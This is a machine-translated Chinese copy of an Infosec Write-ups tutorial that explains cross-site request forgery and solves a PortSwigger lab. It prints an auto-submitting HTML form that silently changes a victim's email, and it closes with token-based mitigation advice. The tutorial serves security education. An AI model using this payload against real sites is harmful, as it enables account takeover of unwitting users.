<html>
<head>
<title>Cross-site request forgery (CSRF) Explained and Exploited I</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">跨站点请求伪造(CSRF)解释和利用I</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cross-site-request-forgery-csrf-explained-and-exploited-i-db464a61a582?source=collection_archive---------2-----------------------#2022-09-16">https://infosecwriteups.com/cross-site-request-forgery-csrf-explained-and-exploited-i-db464a61a582?source=collection_archive---------2-----------------------#2022-09-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="8409" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨！这篇博客将教你CSRF袭击是如何发生的，以及我们如何预防它们。</p><p id="baad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以最大的问题是…</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/0c25911a57b049342ec05fee2ba85fbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*jlnrNQ8uxd_YsIgX.jpg"/></div></div></figure><p id="d3fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">跨站点请求伪造是一个web安全漏洞，使得攻击者能够代表受害者执行操作。攻击者可以代表用户在易受攻击的web上执行所有相关操作。</p><h1 id="6a81" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated"><strong class="ak">说明:</strong></h1><p id="beff" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">让我们以一个典型的网站为例，该网站容易受到跨站点请求伪造的攻击，它允许普通用户注册、更新密码、更改电子邮件和删除帐户以及其他基本功能。并且除了会话之外，没有其他机制来验证用户执行的动作。攻击者可以生成一个URL来更改用户的电子邮件，诱使受害者单击链接并执行操作。有时，只要访问恶意URL，就会自动执行操作并更改电子邮件，从而导致完全接管帐户。</p><p id="74cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该URL可能是服务器上托管的漏洞的链接，其中包括完成操作的请求表单，也可能是带有执行操作的参数的应用程序的直接链接。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="e09d" class="mf ky iq mb b gy mg mh l mi mj"><a class="ae mk" href="http://vulnerable" rel="noopener ugc nofollow" target="_blank">http://vulnerable</a>web.com/email/change-email?value=hacker@mail.com</span></pre><p id="ae98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当受害者访问链接时，会发出post请求，用户的电子邮件会被更改为攻击者的电子邮件。</p></div><div class="ab cl ml mm hu mn" role="separator"><span class="mo bw bk mp mq mr"/><span class="mo bw bk mp mq mr"/><span class="mo bw bk mp mq"/></div><div class="ij ik il im in"><p id="a054" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可能会问，如何才能让T2对CSRF的袭击成功。</p><p id="0e01" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗯！</p><ul class=""><li id="3217" class="ms mt iq jp b jq jr ju jv jy mu kc mv kg mw kk mx my mz na bi translated"><strong class="jp ir">相关动作:</strong>攻击者有动机诱导的应用程序内的相关动作。例如，对用户数据的任何更改，如更新电子邮件和密码。</li><li id="2aa4" class="ms mt iq jp b jq nb ju nc jy nd kc ne kg nf kk mx my mz na bi translated"><strong class="jp ir">基于cookie的会话处理:</strong>这意味着除了会话Cookie，应用程序没有其他方法来验证动作。</li><li id="e287" class="ms mt iq jp b jq nb ju nc jy nd kc ne kg nf kk mx my mz na bi translated"><strong class="jp ir">请求中没有不可预测的变化:</strong>执行动作的请求不包含任何参数，攻击者无法推断或预测这些参数的值。例如，如果攻击者必须知道现有密码的值才能迫使用户更改他们的密码，那么该函数就不容易受到攻击。</li></ul></div><div class="ab cl ml mm hu mn" role="separator"><span class="mo bw bk mp mq mr"/><span class="mo bw bk mp mq mr"/><span class="mo bw bk mp mq"/></div><div class="ij ik il im in"><h1 id="7363" class="kx ky iq bd kz la ng lc ld le nh lg lh li ni lk ll lm nj lo lp lq nk ls lt lu bi translated">CSRF开拓发展:</h1><p id="7642" class="pw-post-body-paragraph jn jo iq jp b jq lv js jt ju lw jw jx jy lx ka kb kc ly ke kf kg lz ki kj kk ij bi translated">这是攻击中唯一难以掌握的过程。</p><p id="a37d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是如果你有一个Burpsuite专业人员，那么它不应该是一个问题，因为它包含了<a class="ae mk" href="https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc" rel="noopener ugc nofollow" target="_blank"> CSRF概念生成器</a>这是完全的生活救星。但是如果您没有Brupsuite Professional，那么您可以使用</p><div class="nl nm gp gr nn no"><a href="https://security.love/CSRF-PoC-Genorator/" rel="noopener  ugc nofollow" target="_blank"><div class="np ab fo"><div class="nq ab nr cl cj ns"><h2 class="bd ir gy z fp nt fr fs nu fu fw ip bi translated">CSRF PoC生成器</h2><div class="nv l"><p class="bd b dl z fp nt fr fs nu fu fw dk translated">CSRF</p></div></div></div></a></div><div class="nl nm gp gr nn no"><a href="https://tools.nakanosec.com/csrf/" rel="noopener  ugc nofollow" target="_blank"><div class="np ab fo"><div class="nq ab nr cl cj ns"><h2 class="bd ir gy z fp nt fr fs nu fu fw ip bi translated">纳卡诺克- CSRF概念验证生成器在线</h2><div class="nw l"><h3 class="bd b gy z fp nt fr fs nu fu fw dk translated">编辑描述</h3></div><div class="nv l"><p class="bd b dl z fp nt fr fs nu fu fw dk translated">tools.nakanosec.com</p></div></div></div></a></div><p id="8d10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这两种工具都更容易产生CSRF漏洞。</p></div><div class="ab cl ml mm hu mn" role="separator"><span class="mo bw bk mp mq mr"/><span class="mo bw bk mp mq mr"/><span class="mo bw bk mp mq"/></div><div class="ij ik il im in"><p id="e126" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们现在可以尝试一些实验室来掌握它的窍门，WDYS？</p><p id="b3b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —</p><p id="e9d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae mk" href="https://portswigger.net/web-security/csrf/lab-no-defenses" rel="noopener ugc nofollow" target="_blank">实验室1:未实施防御的CSRF</a>:</p><p id="0ac9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">本实验室的电子邮件更改功能易受CSRF攻击。</p><p id="afa5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了解决这个实验室，制作一些HTML，使用<a class="ae mk" href="https://portswigger.net/web-security/csrf" rel="noopener ugc nofollow" target="_blank"> CSRF攻击</a>来改变查看者的电子邮件地址，并将其上传到您的漏洞服务器。</p><p id="4400" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用以下凭证登录您自己的帐户:<code class="fe nx ny nz mb b">wiener:peter</code></p><p id="c52e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —</p><p id="0582" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这很简单，我们需要更改查看者的电子邮件地址，并且没有实施任何防御措施。</p><p id="0046" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们登录吧。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oa"><img src="../Images/e7df1933c011114a43417d55c92ec3b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ujXC_9_k4II0KQoQ1AGk8Q.png"/></div></div><figcaption class="ob oc gj gh gi od oe bd b be z dk translated">更改电子邮件功能</figcaption></figure><p id="1f69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">登录后，我们可以看到一个更新电子邮件功能，让我们尝试一下，通过Burp拦截HTTP流量。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi of"><img src="../Images/3159591f1165e120579ecd290645e22e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XZwHR7JXexJeLdb7takA4w.png"/></div></div></figure><p id="f69f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到，只有会话被传递来验证操作，这个请求中没有其他不可预测的值。</p><p id="85b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在复制该请求，并使用上述工具生成POC。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi og"><img src="../Images/b93bdd25de8c30aca376cb34d609bd46.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YYQma-kJZkIjrnbs1HclNg.png"/></div></div></figure><p id="3732" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您应该会得到这样的结果</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="2404" class="mf ky iq mb b gy mg mh l mi mj">&lt;html&gt;<br/> &lt;body&gt;<br/>  &lt;form method="POST" action="<a class="ae mk" href="https://0ae700d403442cd8c0ca028400140041.web-security-academy.net/my-account/change-email" rel="noopener ugc nofollow" target="_blank">https://0ae700d403442cd8c0ca028400140041.web-security-academy.net/my-account/change-email</a>"&gt;<br/>   &lt;input type="hidden" name="email" value="test4%40mail.com"/&gt;<br/>   &lt;input type="submit" value="Submit"&gt;<br/>  &lt;/form&gt;<br/> &lt;/body&gt;<br/>&lt;html&gt;</span></pre><p id="47d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是您需要做一些更改来使它自动提交。</p><pre class="km kn ko kp gt ma mb mc md aw me bi"><span id="1143" class="mf ky iq mb b gy mg mh l mi mj">&lt;html&gt;<br/> &lt;body&gt;<br/>  &lt;form method="POST" action="<a class="ae mk" href="https://0ae700d403442cd8c0ca028400140041.web-security-academy.net/my-account/change-email" rel="noopener ugc nofollow" target="_blank">https://0ae700d403442cd8c0ca028400140041.web-security-academy.net/my-account/change-email</a>"&gt;<br/>   &lt;input type="hidden" name="email" value=<strong class="mb ir">"ENTER EMAIL"</strong>/&gt;<br/>   &lt;input type="submit" value="Submit"&gt;<br/>  &lt;/form&gt;<br/><strong class="mb ir">&lt;script&gt;document.forms[0].submit(); &lt;/script&gt;</strong></span><span id="8495" class="mf ky iq mb b gy oh mh l mi mj"> &lt;/body&gt;<br/>&lt;html&gt;</span></pre><p id="7915" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这使得当受害者访问该链接时，表单被自动提交。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oi"><img src="../Images/47ebf2da8d5368e283aca11638ad05bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tEHkrD8CWQCJSZ2ItT3AkA.png"/></div></div></figure><p id="5554" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在将漏洞存储在服务器上。</p><p id="2a78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后交给受害者。</p><p id="f374" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当受害者访问链接时，实验室将被解决。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi oj"><img src="../Images/5fd36a7933d75eb6025a071a24816f76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r_iUCO4qup5w6oxAgjc_CA.png"/></div></div></figure><p id="96d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在下一部分中，我们将在防御到位的情况下执行这次攻击。</p><p id="3794" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">减轻CSRF: </strong></p><p id="890f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">减轻CSRF攻击最有效的方法是在相关请求中包含令牌。令牌应该是:</p><ul class=""><li id="41ed" class="ms mt iq jp b jq jr ju jv jy mu kc mv kg mw kk mx my mz na bi translated"><strong class="jp ir">高熵</strong>不可预测，一般为会话令牌。</li><li id="1151" class="ms mt iq jp b jq nb ju nc jy nd kc ne kg nf kk mx my mz na bi translated"><strong class="jp ir">链接到用户的会话。</strong></li><li id="26da" class="ms mt iq jp b jq nb ju nc jy nd kc ne kg nf kk mx my mz na bi translated"><strong class="jp ir">在每种情况下，在执行相关动作之前，严格验证</strong>。</li></ul><p id="cd2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有一个关于如何防止CSRF袭击的博客</p><div class="nl nm gp gr nn no"><a href="https://www.veracode.com/blog/secure-development/preventing-csrf-attacks" rel="noopener  ugc nofollow" target="_blank"><div class="np ab fo"><div class="nq ab nr cl cj ns"><h2 class="bd ir gy z fp nt fr fs nu fu fw ip bi translated">防止CSRF攻击| Veracode</h2><div class="nw l"><h3 class="bd b gy z fp nt fr fs nu fu fw dk translated">跨站点请求伪造(CSRF，有时发音为“海浪”,不要与跨站点脚本混淆)是…</h3></div><div class="nv l"><p class="bd b dl z fp nt fr fs nu fu fw dk translated">www.veracode.com</p></div></div><div class="ok l"><div class="ol l om on oo ok op kv no"/></div></div></a></div><p id="496d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一部分，我们将解决一些高级实验室。</p><p id="50fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">到那时为止</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="oq or l"/></div></figure><p id="1ab3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">快乐的黑客❤！</p><h2 id="5cac" class="mf ky iq bd kz os ot dn ld ou ov dp lh jy ow ox ll kc oy oz lp kg pa pb lt pc bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae mk" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>